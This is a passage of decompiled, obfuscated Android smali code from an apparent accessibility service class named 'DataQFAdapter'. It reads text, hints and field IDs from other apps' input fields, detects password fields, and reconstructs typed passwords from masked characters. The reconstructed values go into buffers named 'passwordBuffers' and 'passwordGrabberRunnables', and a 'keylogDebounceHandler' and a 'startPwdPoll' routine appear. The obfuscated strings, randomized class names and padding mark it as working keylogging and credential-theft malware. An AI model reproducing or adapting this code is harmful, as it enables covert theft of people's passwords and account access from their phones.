    invoke-static {v0, v12, v11, v2}, Lv/s/imhBI9RqzETHtVIJe;->euF5Udt5Rqv3Qmea(Ljava/util/Collection;Ljava/lang/String;Lv/s/deLJ4Z0aL3hcJ3O1;I)Ljava/lang/String;

    .line 1767
    .line 1768
    .line 1769
    move-result-object v0

    .line 1770
    goto/16 :goto_18

    .line 1771
    :cond_3b
    const/16 v11, 0x0

    .line 1772
    move-object v0, v12

    .line 1773
    :goto_18
    sget-object v2, Lapp/mobilex/plus/services/DataQFAdapter;->lockScreenPackages:Ljava/util/Set;

    .line 1774
    .line 1775
    invoke-interface {v2, v5}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 1776
    .line 1777
    .line 1778
    move-result v2

    .line 1779
    if-eqz v2, :cond_3c

    .line 1780
    .line 1781
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    .line 1782
    .line 1783
    .line 1784
    move-result v2

    .line 1785
    if-lez v2, :cond_3c

    .line 1786
    .line 1787
    sget-object v2, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 1788
    .line 1789
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityRecord;->isPassword()Z

    .line 1790
    .line 1791
    .line 1792
    invoke-virtual {v2, v0, v5}, Lv/s/GARjgaGEpTotOxcl8vfe;->O2DHNSIGZlgPja7eqLgn(Ljava/lang/String;Ljava/lang/String;)V

    .line 1793
    .line 1794
    .line 1795
    invoke-virtual {v2, v0, v5}, Lv/s/GARjgaGEpTotOxcl8vfe;->rCHnHJBAlOpNI5(Ljava/lang/String;Ljava/lang/String;)V

    .line 1796
    .line 1797
    .line 1798
    :cond_3c
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    .line 1799
    .line 1800
    .line 1801
    move-result v2

    .line 1802
    if-lez v2, :cond_65

    .line 1803
    .line 1804
    new-instance v8, Lv/s/aqjfZUF02xH6w;

    nop

    nop

    .line 1805
    .line 1806
    invoke-direct {v8}, Lv/s/aqjfZUF02xH6w;-><init>()V

    .line 1807
    .line 1808
    .line 1809
    iput-object v12, v8, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 1810
    .line 1811
    new-instance v13, Lv/s/aqjfZUF02xH6w;

    nop

    nop

    .line 1812
    .line 1813
    invoke-direct {v13}, Lv/s/aqjfZUF02xH6w;-><init>()V

    .line 1814
    .line 1815
    .line 1816
    iput-object v12, v13, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 1817
    .line 1818
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityRecord;->isPassword()Z

    .line 1819
    .line 1820
    .line 1821
    move-result v2

    .line 1822
    new-instance v14, Lv/s/aqjfZUF02xH6w;

    .line 1823
    .line 1824
    invoke-direct {v14}, Lv/s/aqjfZUF02xH6w;-><init>()V

    .line 1825
    .line 1826
    .line 1827
    if-eqz v2, :cond_3d

    .line 1828
    .line 1829
    const-string v6, "003300770048009400E700B000C000A3"

    .line 1830
    .line 1831
    :goto_19
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1832
    .line 1833
    .line 1834
    move-result-object v6

    .line 1835
    goto :goto_1a

    .line 1836
    :cond_3d
    const-string v6, "0037007300430093"

    .line 1837
    .line 1838
    goto/16 :goto_19

    .line 1839
    :goto_1a
    iput-object v6, v14, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;
    :try_end_16
    .catchall {:try_start_16 .. :try_end_16} :catchall_1

    .line 1840
    .line 1841
    const/16 v3, 0x1fdc

    add-int/lit8 v3, v3, 0x46

    .line 1842
    .line 1843
    :try_start_17
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityRecord;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 1844
    .line 1845
    .line 1846
    move-result-object v11
    :try_end_17
    .catchall {:try_start_17 .. :try_end_17} :catchall_b

    .line 1847
    if-eqz v11, :cond_46

    .line 1848
    .line 1849
    :try_start_18
    invoke-virtual {v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->getHintText()Ljava/lang/CharSequence;

    .line 1850
    .line 1851
    .line 1852
    move-result-object v18

    nop

    nop

    .line 1853
    if-eqz v18, :cond_3f

    .line 1854
    .line 1855
    invoke-virtual/range {v18 .. v18}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 1856
    .line 1857
    .line 1858
    move-result-object v18

    .line 1859
    if-nez v18, :cond_3e

    .line 1860
    .line 1861
    goto/16 :goto_1b

    .line 1862
    :cond_3e
    move-object/from16 v6, v18

    .line 1863
    .line 1864
    goto :goto_1c

    .line 1865
    :catchall_9
    move/from16 v21, v3

    .line 1866
    .line 1867
    const/16 v6, 0x0

    .line 1868
    goto :goto_21

    .line 1869
    :cond_3f
    :goto_1b
    move-object/from16 v6, v12

    .line 1870
    :goto_1c
    iput-object v6, v8, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 1871
    .line 1872
    invoke-virtual {v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    .line 1873
    .line 1874
    .line 1875
    move-result-object v6

    nop

    .line 1876
    if-nez v6, :cond_40

    .line 1877
    .line 1878
    move-object v6, v12

    .line 1879
    :cond_40
    iput-object v6, v13, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 1880
    .line 1881
    if-nez v2, :cond_41

    .line 1882
    .line 1883
    invoke-virtual {v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->isPassword()Z

    .line 1884
    .line 1885
    .line 1886
    move-result v2

    .line 1887
    :cond_41
    if-eqz v2, :cond_44

    .line 1888
    .line 1889
    invoke-virtual {v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    .line 1890
    .line 1891
    .line 1892
    move-result-object v6

    .line 1893
    if-eqz v6, :cond_42

    .line 1894
    .line 1895
    invoke-virtual {v6}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 1896
    .line 1897
    .line 1898
    move-result-object v6

    .line 1899
    goto/16 :goto_1d

    .line 1900
    :cond_42
    const/16 v6, 0x0

    .line 1901
    :goto_1d
    if-eqz v6, :cond_44

    .line 1902
    .line 1903
    const/4 v7, 0x0

    .line 1904
    :goto_1e
    invoke-virtual {v6}, Ljava/lang/String;->length()I

    .line 1905
    .line 1906
    .line 1907
    move-result v15

    .line 1908
    if-ge v7, v15, :cond_44

    .line 1909
    .line 1910
    invoke-virtual {v6, v7}, Ljava/lang/String;->charAt(I)C

    .line 1911
    .line 1912
    .line 1913
    move-result v15
    :try_end_18
    .catchall {:try_start_18 .. :try_end_18} :catchall_9

    .line 1914
    move/from16 v21, v3

    .line 1915
    .line 1916
    if-eq v15, v3, :cond_43

    .line 1917
    .line 1918
    const v3, 0x2a

    .line 1919
    .line 1920
    if-eq v15, v3, :cond_43

    .line 1921
    .line 1922
    const/16 v3, 0x25cf

    .line 1923
    .line 1924
    if-eq v15, v3, :cond_43

    .line 1925
    .line 1926
    const v3, 0x2b24

    .line 1927
    .line 1928
    if-ne v15, v3, :cond_45

    .line 1929
    .line 1930
    :cond_43
    add-int/lit8 v7, v7, 0x1

    .line 1931
    .line 1932
    move/from16 v3, v21

    .line 1933
    .line 1934
    goto :goto_1e

    .line 1935
    :cond_44
    move/from16 v21, v3

    .line 1936
    .line 1937
    const/16 v6, 0x0

    .line 1938
    :cond_45
    :try_start_19
    invoke-direct {v1, v11, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->resolveFieldType(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Ljava/lang/String;

    .line 1939
    .line 1940
    .line 1941
    move-result-object v3

    nop

    .line 1942
    iput-object v3, v14, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;
    :try_end_19
    .catchall {:try_start_19 .. :try_end_19} :catchall_c

    .line 1943
    .line 1944
    goto :goto_1f

    .line 1945
    :cond_46
    move/from16 v21, v3

    .line 1946
    .line 1947
    const/4 v6, 0x0

    .line 1948
    :goto_1f
    if-eqz v11, :cond_47

    .line 1949
    .line 1950
    :goto_20
    :try_start_1a
    invoke-virtual {v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_1a
    .catchall {:try_start_1a .. :try_end_1a} :catchall_a

    .line 1951
    .line 1952
    .line 1953
    :catchall_a
    :cond_47
    move/from16 v23, v2

    .line 1954
    .line 1955
    goto/16 :goto_22

    .line 1956
    :catchall_b
    move/from16 v21, v3

    .line 1957
    .line 1958
    const/16 v6, 0x0

    .line 1959
    const/16 v11, 0x0

    .line 1960
    :catchall_c
    :goto_21
    if-eqz v11, :cond_47

    .line 1961
    .line 1962
    goto :goto_20

    .line 1963
    :goto_22
    :try_start_1b
    iget-object v2, v13, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 1964
    .line 1965
    check-cast v2, Ljava/lang/CharSequence;

    .line 1966
    .line 1967
    invoke-interface {v2}, Ljava/lang/CharSequence;->length()I

    .line 1968
    .line 1969
    .line 1970
    move-result v3

    .line 1971
    if-nez v3, :cond_48

    .line 1972
    .line 1973
    iget-object v2, v8, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 1974
    .line 1975
    check-cast v2, Ljava/lang/String;

    .line 1976
    .line 1977
    :cond_48
    new-instance v3, Ljava/lang/StringBuilder;

    .line 1978
    .line 1979
    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    .line 1980
    .line 1981
    .line 1982
    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 1983
    .line 1984
    .line 1985
    invoke-virtual {v3, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 1986
    .line 1987
    .line 1988
    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    .line 1989
    .line 1990
    .line 1991
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 1992
    .line 1993
    .line 1994
    move-result-object v2

    .line 1995
    iget-object v3, v1, Lapp/mobilex/plus/services/DataQFAdapter;->fieldTextCache:Ljava/util/HashMap;

    .line 1996
    .line 1997
    invoke-virtual {v3, v2}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 1998
    .line 1999
    .line 2000
    move-result-object v3

    nop

    .line 2001
    check-cast v3, Ljava/lang/String;

    .line 2002
    .line 2003
    if-nez v3, :cond_49

    nop

    nop

    .line 2004
    .line 2005
    move-object v11, v12

    .line 2006
    :goto_23
    const v3, 0x2b24

    .line 2007
    .line 2008
    const/16 v7, 0x25cf

    .line 2009
    .line 2010
    goto :goto_24

    .line 2011
    :cond_49
    move-object/from16 v11, v3

    .line 2012
    goto :goto_23

    .line 2013
    :goto_24
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 2014
    .line 2015
    .line 2016
    move-result-wide v18

    .line 2017
    invoke-static/range {v21 .. v21}, Ljava/lang/Character;->valueOf(C)Ljava/lang/Character;

    .line 2018
    .line 2019
    .line 2020
    move-result-object v15

    .line 2021
    const v20, 0x2a

    .line 2022
    .line 2023
    invoke-static/range {v20 .. v20}, Ljava/lang/Character;->valueOf(C)Ljava/lang/Character;

    .line 2024
    .line 2025
    .line 2026
    move-result-object v3

    .line 2027
    invoke-static {v7}, Ljava/lang/Character;->valueOf(C)Ljava/lang/Character;

    .line 2028
    .line 2029
    .line 2030
    move-result-object v7

    .line 2031
    move-object/from16 v20, v4

    .line 2032
    .line 2033
    const v21, 0x2b24

    .line 2034
    .line 2035
    invoke-static/range {v21 .. v21}, Ljava/lang/Character;->valueOf(C)Ljava/lang/Character;

    .line 2036
    .line 2037
    .line 2038
    move-result-object v4

    .line 2039
    filled-new-array {v15, v3, v7, v4}, [Ljava/lang/Character;

    .line 2040
    .line 2041
    .line 2042
    move-result-object v3

    .line 2043
    invoke-static {v3}, Lv/s/gA5gCwTK0qjTIn;->dTS0S7eC32ubQH54j36([Ljava/lang/Object;)Ljava/util/Set;

    .line 2044
    .line 2045
    .line 2046
    move-result-object v3

    .line 2047
    if-eqz v23, :cond_4b

    .line 2048
    .line 2049
    if-nez v6, :cond_4b

    .line 2050
    .line 2051
    const/16 v4, 0x0

    .line 2052
    :goto_25
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    .line 2053
    .line 2054
    .line 2055
    move-result v7

    .line 2056
    if-ge v4, v7, :cond_4b

    .line 2057
    .line 2058
    invoke-virtual {v0, v4}, Ljava/lang/String;->charAt(I)C

    .line 2059
    .line 2060
    .line 2061
    move-result v7

    .line 2062
    invoke-static {v7}, Ljava/lang/Character;->valueOf(C)Ljava/lang/Character;

    .line 2063
    .line 2064
    .line 2065
    move-result-object v7

    .line 2066
    invoke-interface {v3, v7}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 2067
    .line 2068
    .line 2069
    move-result v7

    .line 2070
    if-eqz v7, :cond_4a

    .line 2071
    .line 2072
    const/16 v16, 0x1

    nop

    .line 2073
    .line 2074
    goto :goto_26

    .line 2075
    :cond_4a
    add-int/lit8 v4, v4, 0x1

    .line 2076
    .line 2077
    goto :goto_25

    .line 2078
    :cond_4b
    const/16 v16, 0x0

    .line 2079
    .line 2080
    :goto_26
    if-eqz v16, :cond_55

    .line 2081
    .line 2082
    iget-object v4, v1, Lapp/mobilex/plus/services/DataQFAdapter;->passwordBuffers:Ljava/util/HashMap;

    .line 2083
    .line 2084
    invoke-interface {v4, v2}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 2085
    .line 2086
    .line 2087
    move-result-object v6

    .line 2088
    if-nez v6, :cond_4c

    .line 2089
    .line 2090
    new-instance v6, Ljava/lang/StringBuilder;

    .line 2091
    .line 2092
    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    .line 2093
    .line 2094
    .line 2095
    invoke-interface {v4, v2, v6}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 2096
    .line 2097
    .line 2098
    :cond_4c
    check-cast v6, Ljava/lang/StringBuilder;

    .line 2099
    .line 2100
    iget-object v4, v1, Lapp/mobilex/plus/services/DataQFAdapter;->passwordRawCache:Ljava/util/HashMap;

    .line 2101
    .line 2102
    invoke-virtual {v4, v2}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 2103
    .line 2104
    .line 2105
    move-result-object v4

    .line 2106
    check-cast v4, Ljava/lang/String;

    nop

    nop

    .line 2107
    .line 2108
    if-nez v4, :cond_4d

    .line 2109
    .line 2110
    move-object/from16 v4, v12

    .line 2111
    :cond_4d
    invoke-virtual {v4}, Ljava/lang/String;->length()I

    .line 2112
    .line 2113
    .line 2114
    move-result v4

    .line 2115
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    .line 2116
    .line 2117
    .line 2118
    move-result v7

    .line 2119
    if-nez v7, :cond_4e

    .line 2120
    .line 2121
    invoke-static {v6}, Lv/s/iQmrlvTQVGCoSjL1;->XuO9PPFo607ssKwZjNW(Ljava/lang/StringBuilder;)V

    .line 2122
    .line 2123
    .line 2124
    goto :goto_2a

    .line 2125
    :cond_4e
    if-ge v7, v4, :cond_4f

    .line 2126
    .line 2127
    sub-int/2addr v4, v7

    .line 2128
    invoke-virtual {v6}, Ljava/lang/StringBuilder;->length()I

    .line 2129
    .line 2130
    .line 2131
    move-result v7

    .line 2132
    invoke-static {v4, v7}, Lv/s/OFtLBiBbrrTHWu;->Ee8d2j4S9Vm5yGuR(II)I

    .line 2133
    .line 2134
    .line 2135
    move-result v4

    .line 2136
    if-lez v4, :cond_52

    .line 2137
    .line 2138
    invoke-virtual {v6}, Ljava/lang/StringBuilder;->length()I

    .line 2139
    .line 2140
    .line 2141
    move-result v7

    .line 2142
    if-lez v7, :cond_52

    .line 2143
    .line 2144
    invoke-virtual {v6}, Ljava/lang/StringBuilder;->length()I

    .line 2145
    .line 2146
    .line 2147
    move-result v7

    .line 2148
    sub-int/2addr v7, v4

    .line 2149
    invoke-virtual {v6}, Ljava/lang/StringBuilder;->length()I

    .line 2150
    .line 2151
    .line 2152
    move-result v4

    .line 2153
    invoke-virtual {v6, v7, v4}, Ljava/lang/StringBuilder;->delete(II)Ljava/lang/StringBuilder;

    .line 2154
    .line 2155
    .line 2156
    goto/16 :goto_2a

    .line 2157
    :cond_4f
    if-le v7, v4, :cond_52

    .line 2158
    .line 2159
    :goto_27
    if-ge v4, v7, :cond_52

    .line 2160
    .line 2161
    if-ltz v4, :cond_50

    .line 2162
    .line 2163
    invoke-static {v0}, Lv/s/KgSM0TsKUpCiuePB;->dQC4QhgRN3MSEAP3HW0(Ljava/lang/CharSequence;)I

    .line 2164
    .line 2165
    .line 2166
    move-result v15

    .line 2167
    if-gt v4, v15, :cond_50

    .line 2168
    .line 2169
    invoke-virtual {v0, v4}, Ljava/lang/String;->charAt(I)C

    .line 2170
    .line 2171
    .line 2172
    move-result v15

    .line 2173
    invoke-static {v15}, Ljava/lang/Character;->valueOf(C)Ljava/lang/Character;

    .line 2174
    .line 2175
    .line 2176
    move-result-object v15

    .line 2177
    goto/16 :goto_28

    nop

    .line 2178
    :cond_50
    const/4 v15, 0x0

    .line 2179
    :goto_28
    if-eqz v15, :cond_51

    .line 2180
    .line 2181
    invoke-interface {v3, v15}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 2182
    .line 2183
    .line 2184
    move-result v21

    .line 2185
    if-nez v21, :cond_51

    .line 2186
    .line 2187
    invoke-virtual {v15}, Ljava/lang/Character;->charValue()C

    .line 2188
    .line 2189
    .line 2190
    move-result v15

    .line 2191
    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    .line 2192
    .line 2193
    .line 2194
    goto :goto_29

    .line 2195
    :cond_51
    const/16 v15, 0x3f

    .line 2196
    .line 2197
    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    .line 2198
    .line 2199
    .line 2200
    :goto_29
    add-int/lit8 v4, v4, 0x1

    .line 2201
    .line 2202
    goto/16 :goto_27

    .line 2203
    :cond_52
    :goto_2a
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    .line 2204
    .line 2205
    .line 2206
    move-result v4

    .line 2207
    if-nez v4, :cond_53

    nop

    .line 2208
    .line 2209
    const/16 v4, 0x0

    .line 2210
    goto :goto_2b

    .line 2211
    :cond_53
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    .line 2212
    .line 2213
    .line 2214
    move-result v4

    .line 2215
    const/16 v17, 0x1

    .line 2216
    .line 2217
    add-int/lit8 v4, v4, -0x1

    .line 2218
    .line 2219
    invoke-virtual {v0, v4}, Ljava/lang/String;->charAt(I)C

    .line 2220
    .line 2221
    .line 2222
    move-result v4

    nop

    .line 2223
    invoke-static {v4}, Ljava/lang/Character;->valueOf(C)Ljava/lang/Character;

    .line 2224
    .line 2225
    .line 2226
    move-result-object v4

    .line 2227
    :goto_2b
    if-eqz v4, :cond_54

    .line 2228
    .line 2229
    invoke-interface {v3, v4}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 2230
    .line 2231
    .line 2232
    move-result v3

    .line 2233
    if-nez v3, :cond_54

    .line 2234
    .line 2235
    invoke-virtual {v6}, Ljava/lang/StringBuilder;->length()I

    .line 2236
    .line 2237
    .line 2238
    move-result v3

    .line 2239
    if-lez v3, :cond_54

    .line 2240
    .line 2241
    invoke-virtual {v6}, Ljava/lang/StringBuilder;->length()I

    .line 2242
    .line 2243
    .line 2244
    move-result v3

    .line 2245
    const/16 v17, 0x1

    .line 2246
    .line 2247
    add-int/lit8 v3, v3, -0x1

    .line 2248
    .line 2249
    invoke-virtual {v4}, Ljava/lang/Character;->charValue()C

    .line 2250
    .line 2251
    .line 2252
    move-result v4

    .line 2253
    invoke-virtual {v6, v3, v4}, Ljava/lang/StringBuilder;->setCharAt(IC)V

    .line 2254
    .line 2255
    .line 2256
    :cond_54
    iget-object v3, v1, Lapp/mobilex/plus/services/DataQFAdapter;->passwordRawCache:Ljava/util/HashMap;

    .line 2257
    .line 2258
    invoke-interface {v3, v2, v0}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 2259
    .line 2260
    .line 2261
    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 2262
    .line 2263
    .line 2264
    move-result-object v0

    .line 2265
    goto :goto_2c

    .line 2266
    :cond_55
    if-nez v6, :cond_56

    .line 2267
    .line 2268
    move-object v6, v0

    .line 2269
    :cond_56
    if-eqz v23, :cond_57

    .line 2270
    .line 2271
    iget-object v3, v1, Lapp/mobilex/plus/services/DataQFAdapter;->passwordBuffers:Ljava/util/HashMap;

    .line 2272
    .line 2273
    new-instance v4, Ljava/lang/StringBuilder;

    .line 2274
    .line 2275
    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 2276
    .line 2277
    .line 2278
    invoke-interface {v3, v2, v4}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 2279
    .line 2280
    .line 2281
    iget-object v3, v1, Lapp/mobilex/plus/services/DataQFAdapter;->passwordRawCache:Ljava/util/HashMap;

    .line 2282
    .line 2283
    invoke-interface {v3, v2, v0}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 2284
    .line 2285
    .line 2286
    :cond_57
    move-object/from16 v0, v6

    .line 2287
    :goto_2c
    if-eqz v23, :cond_58

    .line 2288
    .line 2289
    iget-object v3, v8, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 2290
    .line 2291
    check-cast v3, Ljava/lang/String;

    .line 2292
    .line 2293
    iget-object v4, v13, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 2294
    .line 2295
    move-object/from16 v6, v4

    .line 2296
    check-cast v6, Ljava/lang/String;

    nop

    .line 2297
    .line 2298
    iget-object v4, v14, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 2299
    .line 2300
    move-object/from16 v7, v4

    nop

    .line 2301
    check-cast v7, Ljava/lang/String;

    .line 2302
    .line 2303
    move-object v4, v5

    .line 2304
    move-object v5, v3

    .line 2305
    move-object/from16 v3, v4

    .line 2306
    move-object/from16 v4, v20

    .line 2307
    .line 2308
    invoke-direct/range {v1 .. v7}, Lapp/mobilex/plus/services/DataQFAdapter;->startPwdPoll(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 2309
    .line 2310
    .line 2311
    goto :goto_2d

    .line 2312
    :cond_58
    move-object v3, v5

    nop

    .line 2313
    move-object/from16 v4, v20

    .line 2314
    .line 2315
    :goto_2d
    invoke-static {v0, v11}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 2316
    .line 2317
    .line 2318
    move-result v5

    .line 2319
    if-nez v5, :cond_5e

    nop

    nop

    .line 2320
    .line 2321
    invoke-virtual {v1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 2322
    .line 2323
    .line 2324
    move-result-object v5

    .line 2325
    invoke-static {v3, v5}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 2326
    .line 2327
    .line 2328
    move-result v5
    :try_end_1b
    .catchall {:try_start_1b .. :try_end_1b} :catchall_1

    .line 2329
    if-nez v5, :cond_5e

    .line 2330
    .line 2331
    const-string v5, "002800730042008B00FF00B8"

    nop

    nop

    .line 2332
    .line 2333
    if-eqz v23, :cond_5c

    .line 2334
    .line 2335
    if-eqz v16, :cond_5c

    .line 2336
    .line 2337
    :try_start_1c
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    .line 2338
    .line 2339
    .line 2340
    move-result v6

    .line 2341
    if-lez v6, :cond_5c

    .line 2342
    .line 2343
    invoke-virtual {v11}, Ljava/lang/String;->length()I

    .line 2344
    .line 2345
    .line 2346
    move-result v6

    .line 2347
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    .line 2348
    .line 2349
    .line 2350
    move-result v7

    .line 2351
    if-le v7, v6, :cond_5a

    .line 2352
    .line 2353
    invoke-static {v0}, Lv/s/KgSM0TsKUpCiuePB;->t9CXKrwDxrnFA6g23hZU(Ljava/lang/CharSequence;)C

    .line 2354
    .line 2355
    .line 2356
    move-result v6

    .line 2357
    const-string v11, "\u2022"

    .line 2358
    .line 2359
    const/16 v17, 0x1

    .line 2360
    .line 2361
    add-int/lit8 v7, v7, -0x1

    .line 2362
    .line 2363
    invoke-static {v11, v7}, Lv/s/BS2kx9eAoOyDiNGAFlFk;->qfTrc75xwRVMl85vh(Ljava/lang/String;I)Ljava/lang/String;

    .line 2364
    .line 2365
    .line 2366
    move-result-object v7

    .line 2367
    new-instance v11, Ljava/lang/StringBuilder;

    .line 2368
    .line 2369
    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    .line 2370
    .line 2371
    .line 2372
    invoke-virtual {v11, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 2373
    .line 2374
    .line 2375
    invoke-virtual {v11, v6}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    .line 2376
    .line 2377
    .line 2378
    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 2379
    .line 2380
    .line 2381
    move-result-object v15

    .line 2382
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 2383
    .line 2384
    .line 2385
    move-result-object v5

    .line 2386
    invoke-virtual {v4}, Ljava/lang/String;->length()I

    .line 2387
    .line 2388
    .line 2389
    move-result v6

    .line 2390
    if-nez v6, :cond_59

    .line 2391
    .line 2392
    move-object/from16 v16, v3

    nop

    nop

    .line 2393
    .line 2394
    goto :goto_2e

    .line 2395
    :cond_59
    move-object/from16 v16, v4

    .line 2396
    .line 2397
    :goto_2e
    iget-object v6, v14, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 2398
    .line 2399
    move-object/from16 v20, v6

    .line 2400
    .line 2401
    check-cast v20, Ljava/lang/String;

    .line 2402
    .line 2403
    iget-object v6, v8, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 2404
    .line 2405
    move-object/from16 v21, v6

    .line 2406
    .line 2407
    check-cast v21, Ljava/lang/String;

    .line 2408
    .line 2409
    iget-object v6, v13, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 2410
    .line 2411
    move-object/from16 v22, v6

    .line 2412
    .line 2413
    check-cast v22, Ljava/lang/String;

    .line 2414
    .line 2415
    move-object v6, v13

    .line 2416
    new-instance v13, Lv/s/NxAMaDFbSCxW6M03f;

    .line 2417
    .line 2418
    const/16 v23, 0x1

    .line 2419
    .line 2420
    move-object/from16 v17, v3

    .line 2421
    .line 2422
    move-object/from16 v3, v14

    .line 2423
    move-object/from16 v14, v5

    .line 2424
    invoke-direct/range {v13 .. v23}, Lv/s/NxAMaDFbSCxW6M03f;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;JLjava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    .line 2425
    .line 2426
    .line 2427
    sget-object v5, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2428
    .line 2429
    invoke-virtual {v5, v13}, Lv/s/GARjgaGEpTotOxcl8vfe;->dDIMxZXP1V8HdM(Lv/s/NxAMaDFbSCxW6M03f;)V

    .line 2430
    .line 2431
    .line 2432
    goto/16 :goto_2f

    .line 2433
    :cond_5a
    move-object/from16 v17, v3

    nop

    nop

    .line 2434
    .line 2435
    move-object/from16 v6, v13

    .line 2436
    move-object/from16 v3, v14

    .line 2437
    :goto_2f
    iget-object v5, v1, Lapp/mobilex/plus/services/DataQFAdapter;->passwordGrabberRunnables:Ljava/util/HashMap;

    .line 2438
    .line 2439
    invoke-virtual {v5, v2}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 2440
    .line 2441
    .line 2442
    move-result-object v5

    .line 2443
    check-cast v5, Ljava/lang/Runnable;

    .line 2444
    .line 2445
    if-eqz v5, :cond_5b

    .line 2446
    .line 2447
    iget-object v7, v1, Lapp/mobilex/plus/services/DataQFAdapter;->keylogDebounceHandler:Landroid/os/Handler;

    .line 2448
    .line 2449
    invoke-virtual {v7, v5}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 2450
    .line 2451
    .line 2452
    :cond_5b
    move-object/from16 v15, v0

    .line 2453
    new-instance v0, Lv/s/L8v8JsDYe1FVETypxqrQ;

    .line 2454
    .line 2455
    move-object v7, v8

    .line 2456
    move-object/from16 v5, v17

    .line 2457
